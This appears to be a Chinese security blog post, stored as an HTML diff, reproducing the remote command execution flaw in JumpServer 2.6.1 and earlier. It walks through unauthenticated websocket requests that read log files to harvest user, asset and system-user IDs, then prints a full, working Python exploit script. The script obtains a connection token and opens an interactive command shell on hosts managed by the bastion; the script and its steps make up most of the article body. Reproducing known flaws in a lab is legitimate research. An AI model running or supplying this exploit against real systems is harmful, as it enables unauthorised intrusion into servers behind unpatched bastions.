@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="搭建环境：复现要求最低2核8G，找同事借了台centos虚拟机复现。 1Centos7.7 8G 4核  下载脚本安装JumpServer  因为安装成了2.6.2版本，切换到2.6.1版本 12.&#x2F;jmsctl.sh upgrade v2.6.1.&#x2F;jmsctl.sh restart    漏洞复现：根据参考链接，完整的rce利用步骤如下：  未授权的情况下能够建立webso">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JumpServer远程执行漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="搭建环境：复现要求最低2核8G，找同事借了台centos虚拟机复现。 1Centos7.7 8G 4核  下载脚本安装JumpServer  因为安装成了2.6.2版本，切换到2.6.1版本 12.&#x2F;jmsctl.sh upgrade v2.6.1.&#x2F;jmsctl.sh restart    漏洞复现：根据参考链接，完整的rce利用步骤如下：  未授权的情况下能够建立webso">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210119172033726.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210119194637199.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210119195012188.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210120141237947.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210120104739136.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210120104909060.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210120110623917.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210120144527345.png">
+<meta property="article:published_time" content="2021-01-19T08:26:00.000Z">
+<meta property="article:modified_time" content="2021-01-20T08:26:00.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="JumpServer">
+<meta property="article:tag" content="堡垒机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210119172033726.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>JumpServer远程执行漏洞复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JumpServer远程执行漏洞复现&body=Check out this article: http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=JumpServer远程执行漏洞复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=JumpServer远程执行漏洞复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#搭建环境："><span class="toc-number">1.</span> <span class="toc-text">搭建环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞复现："><span class="toc-number">2.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接："><span class="toc-number">3.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JumpServer远程执行漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-19T08:26:00.000Z" itemprop="datePublished">2021-01-19</time>
+        
+        (Updated: <time datetime="2021-01-20T08:26:00.000Z" itemprop="dateModified">2021-01-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/JumpServer/">JumpServer</a> › <a class="category-link" href="/categories/JumpServer/RCE/">RCE</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/JumpServer/" rel="tag">JumpServer</a>, <a class="tag-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link" href="/tags/%E5%A0%A1%E5%9E%92%E6%9C%BA/" rel="tag">堡垒机</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="搭建环境："><a href="#搭建环境：" class="headerlink" title="搭建环境："></a>搭建环境：</h4><p>复现要求最低2核8G，找同事借了台centos虚拟机复现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Centos7.7 8G 4核</span><br></pre></td></tr></table></figure>
+
+<p>下载<a href="https://github.com/jumpserver/jumpserver/releases/download/v2.6.2/quick_start.sh" target="_blank" rel="noopener">脚本</a>安装JumpServer</p>
+<p><img src="/imgs/image-20210119172033726.png" alt="image-20210119172033726"></p>
+<p>因为安装成了2.6.2版本，切换到2.6.1版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh upgrade v2.6.1</span><br><span class="line">.&#x2F;jmsctl.sh restart</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210119194637199.png" alt="image-20210119194637199"></p>
+<p><img src="/imgs/image-20210119195012188.png" alt="image-20210119195012188"></p>
+<h4 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>根据<a href="https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA" target="_blank" rel="noopener">参考链接</a>，完整的rce利用步骤如下：</p>
+<ol>
+<li>未授权的情况下能够建立websocket连接</li>
+<li>task可控，可以通过websocket对日志文件进行读取</li>
+<li>拿到日志文件中的系统用户，用户，资产字段</li>
+<li>通过3中的字段，可以拿到20s的token</li>
+<li>通过该token能够进入koko的tty，执行命令</li>
+</ol>
+<p>1、首先需要添加资产并且在web终端打开，这一步是为了产生日志数据，因为下面连接服务器需要日志文件的系统用户、管理用户、资产字段</p>
+<p><img src="/imgs/image-20210120141237947.png" alt="image-20210120141237947"></p>
+<p>2、使用<a href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related" target="_blank" rel="noopener">websocket工具</a>手动获取信息，获取一些task id</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.50.2.237:8080&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;jumpserver&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210120104739136.png" alt="image-20210120104739136"></p>
+<p>3、根据task id获取相关信息（可忽略）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.50.2.237:8080&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;c5aad165-9893-4bee-8a52-eb808aa15f47&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210120104909060.png" alt="image-20210120104909060"></p>
+<p>4、获取以下信息  user、asset、system_user</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.50.2.237:8080&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;gunicorn&quot;&#125;</span><br><span class="line"></span><br><span class="line">asset_id&#x3D;b60c9792-a843-4b1b-935d-57134f3fca83&amp;system_user_id&#x3D;ae4b8369-5b69-4e42-941e-9f2f16686a05&amp;user_id&#x3D;452ce66e-87e9-41c2-bc92-b9c110780055</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210120110623917.png" alt="image-20210120110623917"></p>
+<p>5、通过user、asset、system_user利用<code>/api/v1/users/connection-token/</code>拿到一个token（20s），将token发给koko组件可以拿到一个ssh凭证，然后登录用户机器，所以最终执行的脚本是在堡垒机控制的机器而不是堡垒机本身，这个需要注意下。</p>
+<p>替换里的user、asset、system_user然后执行<a href="https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA" target="_blank" rel="noopener">脚本</a>，这里试了几个链接里面的脚本，虽然都连接成功但是不能执行命令，只有peiqi大佬的脚本我这里复现成功了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ws4py.client.threadedclient <span class="keyword">import</span> WebSocketClient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[34mPOC_Des: https://www.o2oxy.cn/                                    \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[34mVersion: JumpServer &lt;= v2.6.1                                     \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[36m使用格式: python3 poc.py                                           \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                            \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[36mCmd         &gt;&gt;&gt; whoami                                    \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ws_long</span><span class="params">(WebSocketClient)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">opened</span><span class="params">(self)</span>:</span></span><br><span class="line">        req = <span class="string">'&#123;"task":"/opt/jumpserver/logs/jumpserver"&#125;'</span></span><br><span class="line">        self.send(req)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">closed</span><span class="params">(self, code, reason=None)</span>:</span></span><br><span class="line">        print(<span class="string">"Closed down:"</span>, code, reason)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">received_message</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        resp = json.loads(str(resp))</span><br><span class="line">        <span class="comment"># print(resp)</span></span><br><span class="line">        data = resp[<span class="string">'message'</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"File"</span> <span class="keyword">in</span> data:</span><br><span class="line">            data = <span class="string">""</span></span><br><span class="line">        print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(websocket, _text)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">"exit"</span>:</span><br><span class="line">        print(<span class="string">f'you have enter "exit", goodbye'</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">"user exit"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line">    recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">    print(re.findall(<span class="string">r'"data":"(.*?)"'</span>, recv_text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span><span class="params">(target_url)</span>:</span></span><br><span class="line">    print(<span class="string">"\033[32m[o] 正在连接目标: &#123;&#125;\033[0m"</span>.format(target_url))</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target_url) <span class="keyword">as</span> websocket:</span><br><span class="line">        recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        resws = json.loads(recv_text)</span><br><span class="line">        id = resws[<span class="string">'id'</span>]</span><br><span class="line">        print(<span class="string">"\033[36m[o] 成功获取 ID: &#123;&#125;\033[0m"</span>.format(id))</span><br><span class="line"></span><br><span class="line">        inittext = json.dumps(&#123;<span class="string">"id"</span>: id, <span class="string">"type"</span>: <span class="string">"TERMINAL_INIT"</span>, <span class="string">"data"</span>: <span class="string">"&#123;\"cols\":164,\"rows\":17&#125;"</span>&#125;)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket, inittext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(re.findall(<span class="string">r'"data":"(.*?)"'</span>, recv_text))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd = str(input(<span class="string">"\033[35mcmd  &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">            cmdtext = json.dumps(&#123;<span class="string">"id"</span>: id, <span class="string">"type"</span>: <span class="string">"TERMINAL_DATA"</span>, <span class="string">"data"</span>: cmd + <span class="string">"\r\n"</span>&#125;)</span><br><span class="line">            <span class="keyword">await</span> send_msg(websocket, cmdtext)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">                recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">                print(re.findall(<span class="string">r'"data":"(.*?)"'</span>, recv_text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_1</span><span class="params">(target_url)</span>:</span></span><br><span class="line">    vuln_url = target_url + <span class="string">"/api/v1/users/connection-token/?user-only=1"</span></span><br><span class="line">    response = requests.get(url=vuln_url, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">401</span> <span class="keyword">or</span> response.status_code == <span class="number">403</span> <span class="keyword">or</span> response.status_code == <span class="number">404</span>:</span><br><span class="line">        print(<span class="string">"\033[32m[o] 目标 &#123;&#125; JumpServer堡垒机为未修复漏洞版本，请通过日志获取关键参数\033[0m"</span>.format(target_url))</span><br><span class="line">        ws_open = str(input(<span class="string">"\033[32m[o] 是否想要提取日志（Y/N） &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">        <span class="keyword">if</span> ws_open == <span class="string">"Y"</span> <span class="keyword">or</span> ws_open == <span class="string">"y"</span>:</span><br><span class="line">            ws = target_url.strip(<span class="string">"http://"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ws = ws_long(<span class="string">'ws://&#123;&#125;/ws/ops/tasks/log/'</span>.format(ws))</span><br><span class="line">                ws.connect()</span><br><span class="line">                ws.run_forever()</span><br><span class="line">                ws.close()</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                ws.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\033[0m"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_2</span><span class="params">(target_url, user, asset, system_user)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> target_url == <span class="string">""</span> <span class="keyword">or</span> asset == <span class="string">""</span> <span class="keyword">or</span> system_user == <span class="string">""</span>:</span><br><span class="line">        print(<span class="string">"\033[31m[x] 请获取 assset 等参数配置\033[0m"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    data = &#123;<span class="string">"user"</span>: user, <span class="string">"asset"</span>: asset, <span class="string">"system_user"</span>: system_user&#125;</span><br><span class="line">    vuln_url = target_url + <span class="string">"/api/v1/users/connection-token/?user-only=1"</span></span><br><span class="line">    <span class="comment"># vuln_url = target_url + "/api/v1/authentication/connection-token/?user-only=1"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(vuln_url, json=data, timeout=<span class="number">5</span>).json()</span><br><span class="line">        print(<span class="string">"\033[32m[o] 正在请求：&#123;&#125;\033[0m"</span>.format(vuln_url))</span><br><span class="line">        token = response[<span class="string">'token'</span>]</span><br><span class="line">        print(<span class="string">"\033[36m[o] 成功获取Token：&#123;&#125;\033[0m"</span>.format(token))</span><br><span class="line">        ws_url = target_url.strip(<span class="string">"http://"</span>)</span><br><span class="line">        ws_url = <span class="string">"ws://"</span> + ws_url + <span class="string">"/koko/ws/token/?target_id=&#123;&#125;"</span>.format(token)</span><br><span class="line">        asyncio.get_event_loop().run_until_complete(main_logic(ws_url))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"\033[31m[x] 请检查 assset 等参数配置,&#123;&#125;\033[0m"</span>.format(e))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(<span class="string">"\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    user = <span class="string">"452ce66e-87e9-41c2-bc92-b9c110780055"</span></span><br><span class="line">    asset = <span class="string">"b60c9792-a843-4b1b-935d-57134f3fca83"</span></span><br><span class="line">    system_user = <span class="string">"ae4b8369-5b69-4e42-941e-9f2f16686a05"</span></span><br><span class="line">    POC_1(target_url)</span><br><span class="line">    POC_2(target_url, user, asset, system_user)</span><br></pre></td></tr></table></figure>
+
+<p>最终通过脚本可执行命令。</p>
+<p><img src="/imgs/image-20210120144527345.png" alt="image-20210120144527345"></p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA</a></p>
+<p><a href="https://saucer-man.com/information_security/520.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/520.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#搭建环境："><span class="toc-number">1.</span> <span class="toc-text">搭建环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞复现："><span class="toc-number">2.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接："><span class="toc-number">3.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
